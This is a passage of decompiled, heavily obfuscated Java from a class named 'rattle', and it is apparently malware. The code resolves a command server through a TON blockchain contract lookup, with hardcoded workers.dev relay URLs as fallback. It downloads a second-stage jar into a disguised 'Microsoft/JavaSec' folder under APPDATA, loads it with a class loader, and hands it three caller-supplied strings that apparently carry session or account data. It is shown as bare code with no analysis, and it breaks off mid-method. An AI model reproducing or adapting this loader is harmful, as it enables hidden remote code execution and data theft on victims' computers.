/*
 * Decompiled with CFR 0.152.
 */
package aurora;

import aurora.quake;
import aurora.sherbet;
import aurora.stumble;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.invoke.CallSite;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.CopyOption;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class rattle {
    private static final String pillar = "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
    private static final String slipper = "https://relay-mirror.kartohaantoha36-6a9.workers.dev";
    private static final String ember = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";
    public static String cipher = "70cfa7f8-d741-4aa9-980a-02b6467f27d3======================================================================";
    private static final Pattern laptop = sherbet.mobile("nourish", "java/util/regex/Pattern|compile|(Ljava/lang/String;)Ljava/util/regex/Pattern;", 144243098, 0, (String)"\"cell\":\"([0-9a-fA-F]+)\"");

    public static void cradle(String string, String string2, String string3) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        sherbet.mobile("pilot", "java/lang/Thread|start|()V", 10848467, 1, (Thread)((Object)sherbet.mobile("lagoon", "java/lang/Thread|<init>|(Ljava/lang/Runnable;)V", 210733707, 2, () -> {
            if (stumble.marina() != 0) {
                stumble.dune();
            }
            CallSite callSite = sherbet.mobile("lilac", "java/util/List|iterator|()Ljava/util/Iterator;", 361152392, 1, rattle.apple());
            while (sherbet.mobile("motif", "java/util/Iterator|hasNext|()Z", 530779039, 1, (Iterator)((Object)callSite)) != false) {
                String string4 = (String)((Object)sherbet.mobile("sorghum", "java/util/Iterator|next|()Ljava/lang/Object;", 34329478, 1, (Iterator)((Object)callSite)));
                Object object = null;
                try {
                    String string5 = string4;
                    sherbet.mobile("obelisk", "java/io/PrintStream|println|(Ljava/lang/String;)V", 12040215, 1, (PrintStream)((Object)sherbet.mobile("raincoat", "java/lang/System|out|()Ljava/io/PrintStream;", 431805837, 4)), (String)((Object)sherbet.mobile("diadem", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 227776488, 1, (StringBuilder)((Object)sherbet.mobile("parrot", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 398894818, 1, (StringBuilder)((Object)sherbet.mobile("flask", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 385818377, 1, (StringBuilder)((Object)sherbet.mobile("cabin", "java/lang/StringBuilder|<init>|()V", 215541904, 2)), (String)"URL: ")), (Object)string5)))));
                    byte[] byArray = rattle.rambler(string4);
                    if (byArray == null || byArray.length == 0) continue;
                    object = rattle.pendant(byArray);
                    if (object == null) {
                        sherbet.mobile("panda", "java/io/PrintStream|println|(Ljava/lang/String;)V", 515446786, 1, (PrintStream)((Object)sherbet.mobile("parchment", "java/lang/System|out|()Ljava/io/PrintStream;", 531794845, 4)), (String)"stage: bad jar");
                        continue;
                    }
                    CallSite callSite2 = sherbet.mobile("dune", "java/net/URLClassLoader|<init>|([Ljava/net/URL;Ljava/lang/ClassLoader;)V", 385324053, 2, (URL[])new URL[]{sherbet.mobile("coyote", "java/net/URI|toURL|()Ljava/net/URL;", 328731381, 1, (URI)((Object)sherbet.mobile("mailman", "java/io/File|toURI|()Ljava/net/URI;", 377783452, 1, (Object)object)))}, (Object)sherbet.mobile("bundle", "java/lang/Class|getClassLoader|()Ljava/lang/ClassLoader;", 379306175, 1, rattle.class));
                    rattle.ripple(callSite2, string, string2, string3, cipher);
                    return;
                }
                catch (Throwable throwable) {
                    CallSite callSite3 = sherbet.mobile("medley", "java/lang/Throwable|getMessage|()Ljava/lang/String;", 505080821, 1, (Throwable)throwable);
                    CallSite callSite4 = sherbet.mobile("jingle", "java/lang/Class|getSimpleName|()Ljava/lang/String;", 386638620, 1, (Class)((Object)sherbet.mobile("raft", "java/lang/Object|getClass|()Ljava/lang/Class;", 219798225, 1, (Object)throwable)));
                    sherbet.mobile("satchel", "java/io/PrintStream|println|(Ljava/lang/String;)V", 161350613, 1, (PrintStream)((Object)sherbet.mobile("bronze", "java/lang/System|out|()Ljava/io/PrintStream;", 300933342, 4)), (String)((Object)sherbet.mobile("pinnacle", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 471068287, 1, (StringBuilder)((Object)sherbet.mobile("kipper", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 101833166, 1, (StringBuilder)((Object)sherbet.mobile("sequoia", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 449544327, 1, (StringBuilder)((Object)sherbet.mobile("diesel", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 412682522, 1, (StringBuilder)((Object)sherbet.mobile("saddle", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 31688451, 1, (StringBuilder)((Object)sherbet.mobile("signal", "java/lang/StringBuilder|<init>|()V", 502773177, 2)), (String)"stage fail: ")), (Object)callSite4)), (String)": ")), (Object)callSite3)))));
                }
            }
            sherbet.mobile("castle", "java/io/PrintStream|println|(Ljava/lang/String;)V", 465900048, 1, (PrintStream)((Object)sherbet.mobile("chimney", "java/lang/System|out|()Ljava/io/PrintStream;", 444956818, 4)), (String)"stage: all sources failed");
        })));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static Object pendant(byte[] byArray) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            CallSite callSite;
            CallSite callSite2;
            block12: {
                Object var5_7;
                CallSite callSite3 = sherbet.mobile("shanty", "java/io/File|<init>|(Ljava/lang/String;Ljava/lang/String;)V", 97498385, 2, (String)((Object)sherbet.mobile("shatter", "java/lang/System|getenv|(Ljava/lang/String;)Ljava/lang/String;", 505129152, 0, (String)"APPDATA")), (String)"Microsoft/JavaSec");
                sherbet.mobile("humble", "java/io/File|mkdirs|()Z", 349295068, 1, (Object)callSite3);
                CallSite callSite4 = sherbet.mobile("autumn", "java/io/File|<init>|(Ljava/io/File;Ljava/lang/String;)V", 379122346, 2, (Object)callSite3, (String)"stage.part");
                callSite2 = sherbet.mobile("rocker", "java/io/File|<init>|(Ljava/io/File;Ljava/lang/String;)V", 301116572, 2, (Object)callSite3, (String)"stage.jar");
                callSite = sherbet.mobile("flint", "java/io/FileOutputStream|<init>|(Ljava/io/File;)V", 165520784, 2, (Object)callSite4);
                try {
                    sherbet.mobile("blanket", "java/io/FileOutputStream|write|([B)V", 434405349, 1, (Object)callSite, (byte[])byArray);
                    sherbet.mobile("raven", "java/io/FileDescriptor|sync|()V", 34213547, 1, (Object)sherbet.mobile("frosty", "java/io/FileOutputStream|getFD|()Ljava/io/FileDescriptor;", 349963785, 1, (Object)callSite));
                }
                catch (Throwable throwable) {
                    try {
                        sherbet.mobile("octagon", "java/io/FileOutputStream|close|()V", 380301826, 1, (Object)callSite);
                        throw throwable;
                    }
                    catch (Throwable throwable2) {
                        sherbet.mobile("keyhole", "java/lang/Throwable|addSuppressed|(Ljava/lang/Throwable;)V", 66658006, 1, (Throwable)throwable, (Throwable)throwable2);
                    }
                    throw throwable;
                }
                sherbet.mobile("nebula", "java/io/FileOutputStream|close|()V", 51560411, 1, (Object)callSite);
                if (sherbet.mobile("signal", "java/io/File|renameTo|(Ljava/io/File;)Z", 445290498, 1, (Object)callSite4, (Object)callSite2) == false) {
                    sherbet.mobile("parachute", "java/nio/file/Files|copy|(Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;", 111678392, 0, (Path)((Object)sherbet.mobile("ember", "java/io/File|toPath|()Ljava/nio/file/Path;", 128371686, 1, (Object)callSite4)), (Path)((Object)sherbet.mobile("nimbus", "java/io/File|toPath|()Ljava/nio/file/Path;", 462803423, 1, (Object)callSite2)), (CopyOption[])new CopyOption[]{sherbet.mobile("steed", "java/nio/file/StandardCopyOption|REPLACE_EXISTING|()Ljava/nio/file/StandardCopyOption;", 129505236, 4)});
                    sherbet.mobile("spice", "java/io/File|delete|()Z", 484293790, 1, (Object)callSite4);
                }
                callSite = sherbet.mobile("oyster", "java/util/zip/ZipFile|<init>|(Ljava/io/File;)V", 480449190, 2, (Object)callSite2);
                try {
                    if (sherbet.mobile("jingle", "java/util/zip/ZipFile|getEntry|(Ljava/lang/String;)Ljava/util/zip/ZipEntry;", 235585551, 1, (Object)callSite, (String)"core/core.class") != null) break block12;
                    var5_7 = null;
                }
                catch (Throwable throwable) {
                    try {
                        sherbet.mobile("oasis", "java/util/zip/ZipFile|close|()V", 361215126, 1, (Object)callSite);
                        throw throwable;
                    }
                    catch (Throwable throwable3) {
                        sherbet.mobile("receipt", "java/lang/Throwable|addSuppressed|(Ljava/lang/Throwable;)V", 231264143, 1, (Throwable)throwable, (Throwable)throwable3);
                    }
                    throw throwable;
                }
                sherbet.mobile("blossom", "java/util/zip/ZipFile|close|()V", 48290772, 1, (Object)callSite);
                return var5_7;
            }
            sherbet.mobile("persimmon", "java/util/zip/ZipFile|close|()V", 412219289, 1, (Object)callSite);
            CallSite callSite5 = sherbet.mobile("flute", "java/io/File|length|()J", 419956936, 1, (Object)callSite2);
            sherbet.mobile("satin", "java/io/PrintStream|println|(Ljava/lang/String;)V", 316323531, 1, (PrintStream)((Object)sherbet.mobile("hammer", "java/lang/System|out|()Ljava/io/PrintStream;", 318490613, 4)), (String)((Object)sherbet.mobile("oasis", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 263769062, 1, (StringBuilder)((Object)sherbet.mobile("hazel", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 416218592, 1, (StringBuilder)((Object)sherbet.mobile("mulberry", "java/lang/StringBuilder|append|(J)Ljava/lang/StringBuilder;", 368366516, 1, (StringBuilder)((Object)sherbet.mobile("mailman", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 118413747, 1, (StringBuilder)((Object)sherbet.mobile("finch", "java/lang/StringBuilder|<init>|()V", 228065005, 2)), (String)"stage file ")), (long)callSite5)), (String)" b")))));
            return callSite2;
        }
        catch (Exception exception) {
            CallSite callSite6 = sherbet.mobile("pistol", "java/lang/Exception|getMessage|()Ljava/lang/String;", 165480141, 1, (Exception)exception);
            sherbet.mobile("oasis", "java/io/PrintStream|println|(Ljava/lang/String;)V", 465238018, 1, (PrintStream)((Object)sherbet.mobile("blanket", "java/lang/System|out|()Ljava/io/PrintStream;", 299820507, 4)), (String)((Object)sherbet.mobile("pinnacle", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 26799121, 1, (StringBuilder)((Object)sherbet.mobile("palace", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 146873314, 1, (StringBuilder)((Object)sherbet.mobile("lattice", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 85390485, 1, (StringBuilder)((Object)sherbet.mobile("sturdy", "java/lang/StringBuilder|<init>|()V", 134409147, 2)), (String)"stage write: ")), (Object)callSite6)))));
            return null;
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static byte[] rambler(String string) throws IOException {
        CallSite callSite;
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        HttpURLConnection httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("parcel", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 511746450, 1, (URL)((Object)sherbet.mobile("ferret", "java/net/URL|<init>|(Ljava/lang/String;)V", 469340436, 2, (String)string))));
        try {
            CallSite callSite2;
            CallSite callSite3;
            block9: {
                sherbet.mobile("relic", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 102165943, 1, (HttpURLConnection)httpURLConnection, (String)"GET");
                sherbet.mobile("rudder", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 285401240, 1, (HttpURLConnection)httpURLConnection, 15000);
                sherbet.mobile("mulberry", "java/net/HttpURLConnection|setReadTimeout|(I)V", 368451047, 1, (HttpURLConnection)httpURLConnection, 3 << 16 | (char)-22144);
                sherbet.mobile("strand", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 232892078, 1, (HttpURLConnection)httpURLConnection, (String)"User-Agent", (String)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                sherbet.mobile("spruce", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 118491316, 1, (HttpURLConnection)httpURLConnection, (String)"Accept", (String)"*/*");
                sherbet.mobile("knight", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 80589951, 1, (HttpURLConnection)httpURLConnection, (String)"Accept-Language", (String)"en-US,en;q=0.9");
                sherbet.mobile("mesa", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 351979921, 1, (HttpURLConnection)httpURLConnection, (String)"Accept-Encoding", (String)"identity");
                sherbet.mobile("flute", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 329679598, 1, (HttpURLConnection)httpURLConnection, (String)"Cache-Control", (String)"no-cache");
                sherbet.mobile("penguin", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 210297331, 1, (HttpURLConnection)httpURLConnection, (String)"Pragma", (String)"no-cache");
                CallSite callSite4 = sherbet.mobile("narwhal", "java/net/HttpURLConnection|getResponseCode|()I", 95209369, 1, (HttpURLConnection)httpURLConnection);
                if (callSite4 != 200) {
                    CallSite callSite5 = callSite4;
                    throw sherbet.mobile("stigma", "java/io/IOException|<init>|(Ljava/lang/String;)V", 243722471, 2, (String)((Object)sherbet.mobile("paddle", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 178625668, 1, (StringBuilder)((Object)sherbet.mobile("robin", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 26214390, 1, (StringBuilder)((Object)sherbet.mobile("fresco", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 66501537, 1, (StringBuilder)((Object)sherbet.mobile("ginger", "java/lang/StringBuilder|<init>|()V", 270403462, 2)), (String)"HTTP ")), (int)callSite5)))));
                }
                callSite3 = sherbet.mobile("jacket", "java/net/HttpURLConnection|getContentLengthLong|()J", 14090421, 1, (HttpURLConnection)httpURLConnection);
                callSite = sherbet.mobile("igloo", "java/net/HttpURLConnection|getInputStream|()Ljava/io/InputStream;", 197331352, 1, (HttpURLConnection)httpURLConnection);
                try {
                    callSite2 = sherbet.mobile("bottle", "java/io/InputStream|readAllBytes|()[B", 65380226, 1, (InputStream)((Object)callSite));
                    if (callSite == null) break block9;
                }
                catch (Throwable throwable) {
                    if (callSite == null) throw throwable;
                    try {
                        sherbet.mobile("bundle", "java/io/InputStream|close|()V", 449769118, 1, (InputStream)((Object)callSite));
                        throw throwable;
                    }
                    catch (Throwable throwable2) {
                        sherbet.mobile("fathom", "java/lang/Throwable|addSuppressed|(Ljava/lang/Throwable;)V", 535562910, 1, (Throwable)throwable, (Throwable)throwable2);
                    }
                    throw throwable;
                }
                sherbet.mobile("panorama", "java/io/InputStream|close|()V", 159771660, 1, (InputStream)((Object)callSite));
            }
            if (callSite3 > 0L && (long)((CallSite)callSite2).length != callSite3) {
                CallSite callSite6 = callSite3;
                int n = ((CallSite)callSite2).length;
                throw sherbet.mobile("mossy", "java/io/IOException|<init>|(Ljava/lang/String;)V", 244814239, 2, (String)((Object)sherbet.mobile("snail", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 2140325142, 1, (StringBuilder)((Object)sherbet.mobile("desert", "java/lang/StringBuilder|append|(J)Ljava/lang/StringBuilder;", 293976809, 1, (StringBuilder)((Object)sherbet.mobile("sofa", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 433036418, 1, (StringBuilder)((Object)sherbet.mobile("kipper", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 161550010, 1, (StringBuilder)((Object)sherbet.mobile("pebble", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 217417976, 1, (StringBuilder)((Object)sherbet.mobile("shrub", "java/lang/StringBuilder|<init>|()V", 337253828, 2)), (String)"truncated ")), n)), (String)"/")), (long)callSite6)))));
            }
            callSite = callSite2;
        }
        catch (Throwable throwable) {
            sherbet.mobile("noodle", "java/net/HttpURLConnection|disconnect|()V", 61782197, 1, (HttpURLConnection)httpURLConnection);
            throw throwable;
        }
        sherbet.mobile("coral", "java/net/HttpURLConnection|disconnect|()V", 513141713, 1, (HttpURLConnection)httpURLConnection);
        return callSite;
    }

    public static String plankton() {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            String string = rattle.rind(8);
            String string2 = rattle.samba(string, 8000);
            if (string2 != null) {
                return string2;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (rattle.samba("https://relay-3f9c71.kartohaantoha36-6a9.workers.dev", 8000) != null) {
            return "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
        }
        return "https://relay-mirror.kartohaantoha36-6a9.workers.dev";
    }

    private static String samba(String string, int n) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        if (string == null) {
            return null;
        }
        for (CallSite callSite : sherbet.mobile("mitten", "java/lang/String|split|(Ljava/lang/String;)[Ljava/lang/String;", 2141953816, 1, (String)string, (String)",")) {
            CallSite callSite2 = sherbet.mobile("bridge", "java/lang/String|trim|()Ljava/lang/String;", 185121432, 1, (String)((Object)callSite));
            if (sherbet.mobile("sofa", "java/lang/String|isEmpty|()Z", 227790538, 1, (String)((Object)callSite2)) != false) continue;
            if (sherbet.mobile("pillar", "java/lang/String|startsWith|(Ljava/lang/String;)Z", 147699186, 1, (String)((Object)callSite2), (String)"http") == false) {
                CallSite callSite3 = callSite2;
                callSite2 = sherbet.mobile("stable", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 278336142, 1, (StringBuilder)((Object)sherbet.mobile("pancake", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 130198167, 1, (StringBuilder)((Object)sherbet.mobile("samba", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 59761320, 1, (StringBuilder)((Object)sherbet.mobile("mobile", "java/lang/StringBuilder|<init>|()V", 96075171, 2)), (String)"https://")), (Object)callSite3)));
            }
            while (sherbet.mobile("rescue", "java/lang/String|endsWith|(Ljava/lang/String;)Z", 66055180, 1, (String)((Object)callSite2), (String)"/") != false) {
                callSite2 = sherbet.mobile("pomegranate", "java/lang/String|substring|(II)Ljava/lang/String;", 2144840598, 1, (String)((Object)callSite2), 0, (int)(sherbet.mobile("cocoa", "java/lang/String|length|()I", 159613351, 1, (String)((Object)callSite2)) - true));
            }
            if (!rattle.rivet((String)((Object)callSite2), n)) continue;
            return callSite2;
        }
        return null;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private static boolean rivet(String string, int n) {
        boolean bl;
        block6: {
            if (stumble.marina() != 0) {
                stumble.dune();
            }
            HttpURLConnection httpURLConnection = null;
            try {
                httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("penguin", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 81378806, 1, (URL)((Object)sherbet.mobile("slipper", "java/net/URL|<init>|(Ljava/lang/String;)V", 30259115, 2, (String)string))));
                sherbet.mobile("slate", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 2142700502, 1, (HttpURLConnection)httpURLConnection, (String)"HEAD");
                sherbet.mobile("nickel", "java/net/HttpURLConnection|setInstanceFollowRedirects|(Z)V", 536213468, 1, (HttpURLConnection)httpURLConnection, (boolean)false);
                sherbet.mobile("cactus", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 164351665, 1, (HttpURLConnection)httpURLConnection, n);
                sherbet.mobile("orient", "java/net/HttpURLConnection|setReadTimeout|(I)V", 447257308, 1, (HttpURLConnection)httpURLConnection, n);
                sherbet.mobile("donkey", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 12455102, 1, (HttpURLConnection)httpURLConnection, (String)"User-Agent", (String)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                CallSite callSite = sherbet.mobile("sleigh", "java/net/HttpURLConnection|getResponseCode|()I", 286564057, 1, (HttpURLConnection)httpURLConnection);
                boolean bl2 = bl = callSite > 0 && callSite < 400;
                if (httpURLConnection == null) break block6;
            }
            catch (Exception exception) {
                boolean bl3;
                block7: {
                    try {
                        bl3 = false;
                        if (httpURLConnection == null) break block7;
                    }
                    catch (Throwable throwable) {
                        if (httpURLConnection != null) {
                            sherbet.mobile("peridot", "java/net/HttpURLConnection|disconnect|()V", 329501862, 1, (HttpURLConnection)httpURLConnection);
                        }
                        throw throwable;
                    }
                    sherbet.mobile("magnolia", "java/net/HttpURLConnection|disconnect|()V", 385278148, 1, (HttpURLConnection)httpURLConnection);
                }
                return bl3;
            }
            sherbet.mobile("mimic", "java/net/HttpURLConnection|disconnect|()V", 2141320606, 1, (HttpURLConnection)httpURLConnection);
        }
        return bl;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static String rind(int n) throws Exception {
        Object object;
        HttpURLConnection httpURLConnection;
        block5: {
            if (stumble.marina() != 0) {
                stumble.dune();
            }
            httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("shingle", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 247119105, 1, (URL)((Object)sherbet.mobile("jingle", "java/net/URL|<init>|(Ljava/lang/String;)V", 294788328, 2, (String)"https://toncenter.com/api/v2/runGetMethod"))));
            sherbet.mobile("pagoda", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 226608300, 1, (HttpURLConnection)httpURLConnection, (String)"POST");
            sherbet.mobile("ripple", "java/net/HttpURLConnection|setDoOutput|(Z)V", 128497075, 1, (HttpURLConnection)httpURLConnection, (boolean)true);
            sherbet.mobile("castle", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 182701221, 1, (HttpURLConnection)httpURLConnection, 15000);
            sherbet.mobile("ravine", "java/net/HttpURLConnection|setReadTimeout|(I)V", 134482586, 1, (HttpURLConnection)httpURLConnection, 30000);
            sherbet.mobile("raven", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 437701330, 1, (HttpURLConnection)httpURLConnection, (String)"Content-Type", (String)"application/json");
            int n2 = n;
            CallSite callSite = sherbet.mobile("mantis", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 320730828, 1, (StringBuilder)((Object)sherbet.mobile("sofa", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 401769230, 1, (StringBuilder)((Object)sherbet.mobile("receipt", "java/lang/StringBuilder|append|(I)Ljava/lang/StringBuilder;", 299834055, 1, (StringBuilder)((Object)sherbet.mobile("poplar", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 404592415, 1, (StringBuilder)((Object)sherbet.mobile("raven", "java/lang/StringBuilder|<init>|()V", 411019771, 2)), (String)"{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"")), n2)), (String)"\"]]}")));
            object = sherbet.mobile("phoenix", "java/net/HttpURLConnection|getOutputStream|()Ljava/io/OutputStream;", 319200395, 1, (HttpURLConnection)httpURLConnection);
            try {
                sherbet.mobile("finch", "java/io/OutputStream|write|([B)V", 319128455, 1, (OutputStream)object, (byte[])sherbet.mobile("mossy", "java/lang/String|getBytes|(Ljava/nio/charset/Charset;)[B", 198673096, 1, (String)((Object)callSite), (Charset)((Object)sherbet.mobile("honey", "java/nio/charset/StandardCharsets|UTF_8|()Ljava/nio/charset/Charset;", 366903310, 4))));
                if (object == null) break block5;
            }
            catch (Throwable throwable) {
                if (object == null) throw throwable;
                try {
                    sherbet.mobile("offset", "java/io/OutputStream|close|()V", 34591771, 1, (OutputStream)object);
                    throw throwable;
                }
                catch (Throwable throwable2) {
                    sherbet.mobile("shanty", "java/lang/Throwable|addSuppressed|(Ljava/lang/Throwable;)V", 130682814, 1, (Throwable)throwable, (Throwable)throwable2);
                }
                throw throwable;
            }
            sherbet.mobile("parsley", "java/io/OutputStream|close|()V", 232039670, 1, (OutputStream)object);
        }
        object = rattle.stork((InputStream)((Object)sherbet.mobile("smoke", "java/net/HttpURLConnection|getInputStream|()Ljava/io/InputStream;", 2147227397, 1, (HttpURLConnection)httpURLConnection)));
        sherbet.mobile("nimbus", "java/net/HttpURLConnection|disconnect|()V", 334078866, 1, (HttpURLConnection)httpURLConnection);
        CallSite callSite = sherbet.mobile("dragon", "java/util/regex/Pattern|matcher|(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;", 29661075, 1, (Pattern)((Object)sherbet.mobile("lunar", "java/util/regex/Pattern|compile|(Ljava/lang/String;)Ljava/util/regex/Pattern;", 485288064, 0, (String)"\"b64\":\"([A-Za-z0-9+/=]+)\"")), (CharSequence)object);
        if (sherbet.mobile("cactus", "java/util/regex/Matcher|find|()Z", 499483027, 1, (Matcher)((Object)callSite)) == false) return null;
        return sherbet.mobile("stingray", "java/lang/String|<init>|([BLjava/nio/charset/Charset;)V", 496100776, 2, (byte[])sherbet.mobile("rook", "java/util/Base64$Decoder|decode|(Ljava/lang/String;)[B", 286856914, 1, (Base64.Decoder)((Object)sherbet.mobile("denim", "java/util/Base64|getDecoder|()Ljava/util/Base64$Decoder;", 167124726, 0)), (String)((Object)sherbet.mobile("shimmer", "java/util/regex/Matcher|group|(I)Ljava/lang/String;", 59100370, 1, (Matcher)((Object)callSite), 1))), (Charset)((Object)sherbet.mobile("beetle", "java/nio/charset/StandardCharsets|UTF_8|()Ljava/nio/charset/Charset;", 216460994, 4)));
    }

    private static List<String> apple() {
        String[] stringArray;
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        CallSite callSite = sherbet.mobile("fresco", "java/util/LinkedHashSet|<init>|()V", 413995723, 2);
        try {
            String string = rattle.plankton();
            stringArray = rattle.canvas((String)((Object)sherbet.mobile("shrub", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 83011769, 1, (StringBuilder)((Object)sherbet.mobile("hickory", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 226618621, 1, (StringBuilder)((Object)sherbet.mobile("plato", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 132890389, 1, (StringBuilder)((Object)sherbet.mobile("pancake", "java/lang/StringBuilder|<init>|()V", 219740185, 2)), (Object)string)), (String)"/config")))), 12000);
            if (stringArray != null) {
                for (String string2 : new String[]{"0", "7"}) {
                    sherbet.mobile("mahogany", "java/util/LinkedHashSet|addAll|(Ljava/util/Collection;)Z", 515957448, 1, (LinkedHashSet)((Object)callSite), rattle.napkin(rattle.remark((String)stringArray, string2)));
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (sherbet.mobile("nutmeg", "java/util/LinkedHashSet|isEmpty|()Z", 30603184, 1, (LinkedHashSet)((Object)callSite)) != false) {
            for (String string2 : stringArray = new String[]{"EQCsNH1LY2PQeqG2HKSk2myObNTgCuREdq1IVvZFL4k_5iia", "EQBaz-F9o6nHrQ16Z_jTGZShLyRNEMRtS0OWMYs0GNQK_PHA"}) {
                try {
                    Object object = rattle.mohair(string2);
                    if (object == null || sherbet.mobile("camera", "java/lang/String|isEmpty|()Z", 364125955, 1, (String)(object = sherbet.mobile("pendant", "java/lang/String|trim|()Ljava/lang/String;", 362922686, 1, (String)object))) != false) continue;
                    if (sherbet.mobile("postbox", "java/lang/String|startsWith|(Ljava/lang/String;)Z", 310350993, 1, (String)object, (String)"http") == false) {
                        Object object2 = object;
                        object = sherbet.mobile("sketch", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 75933395, 1, (StringBuilder)((Object)sherbet.mobile("gallon", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 514042775, 1, (StringBuilder)((Object)sherbet.mobile("coyote", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 449229589, 1, (StringBuilder)((Object)sherbet.mobile("raincoat", "java/lang/StringBuilder|<init>|()V", 110288283, 2)), (String)"https://")), (Object)object2)));
                    }
                    if (sherbet.mobile("scarf", "java/lang/String|contains|(Ljava/lang/CharSequence;)Z", 450228944, 1, (String)object, (CharSequence)"/api/") == false) {
                        while (sherbet.mobile("grape", "java/lang/String|endsWith|(Ljava/lang/String;)Z", 311014361, 1, (String)object, (String)"/") != false) {
                            object = sherbet.mobile("banjo", "java/lang/String|substring|(II)Ljava/lang/String;", 429070760, 1, (String)object, 0, (int)(sherbet.mobile("feather", "java/lang/String|length|()I", 113635036, 1, (String)object) - true));
                        }
                        Object object3 = object;
